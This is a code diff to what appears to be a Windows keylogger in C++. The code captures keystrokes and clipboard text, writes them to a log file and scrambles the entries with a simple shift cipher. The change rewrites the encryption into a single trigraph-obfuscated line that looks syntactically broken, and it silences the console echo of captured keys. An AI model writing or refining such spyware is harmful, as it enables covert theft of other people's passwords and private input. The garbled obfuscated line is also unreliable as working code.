@@ -10,30 +10,17 @@ bool Caps = false;
 
 
 std::string Log::EncryptMyString(std::string UnencryptedString) {
-    if (CryptLogs) {
-        std::string CryptedString;
-        std::string ThrowAwayKey;
-        ThrowAwayKey += (char)(rand() % KeyShiftLimit + 1);
-        for (int r = 0; r < UnencryptedString.size(); r++) {
-            if ((int)ThrowAwayKey[0] % 2 == 0) {
-                if (UnencryptedString[r] % 2 == 0)
-                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 2;
-                else
-                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 4;
-            }
-            else {
-                if (UnencryptedString[r] % 2 == 0)
-                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 1;
-                else
-                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 3;
-            }
-        }
-        UnencryptedString = CryptedString;
-        ZeroMemory(&CryptedString,sizeof(CryptedString));
-        Base64::encode(ThrowAwayKey, &CryptedString);
-        UnencryptedString += CryptedString + ';';
+    std::string CryptedString = {};
+    std::string temp;
+    std::string ThrowAwayKey;
+    ThrowAwayKey += (char)(rand() % KeyShiftLimit + 1);
+    for (int r = 0; r < UnencryptedString.size(); r++) {
+        *(((CryptedString??(r??)??'CryptedString??(r??)) not_eq 1) ? &CryptedString : &ThrowAwayKey) += (UnencryptedString[r] + (int)ThrowAwayKey[0] + ((UnencryptedString[r] % 2 == 0) ? 1 : 3) + (((int)ThrowAwayKey[0] % 2 == 0) ? 1 : 0));
     }
-    return UnencryptedString;
+    Base64::encode(ThrowAwayKey, &temp);
+    CryptedString += temp;
+    CryptedString += ';';
+    return CryptLogs ? CryptedString : UnencryptedString;
 }
 
 void Log::LogItInt(int key_stroke) {
@@ -44,7 +31,7 @@ void Log::LogItInt(int key_stroke) {
 
     fopen_s(&OUTPUT_FILE, log.c_str() , "a+");
 
-    std::cout << key_stroke << std::endl;
+    //std::cout << key_stroke << std::endl;
 
     switch (key_stroke) {                                                       //fix OEMX keys by checking for shift and keyb layout
     case VK_OEM_COPY:
@@ -212,9 +199,7 @@ void Log::LogItInt(int key_stroke) {
 }
 
 void Log::LogItChar(std::string Value) {
-
     Value += "\n";
-
     std::ofstream File;
     File.open(log, std::ios_base::app);
     File << EncryptMyString(Value);
@@ -422,5 +407,6 @@ std::string GetClipBoardTxt() {
     }
     CloseClipboard();
     std::string Ret = ClipBuffer;
+    Ret += '\0';
     return Ret;
 }
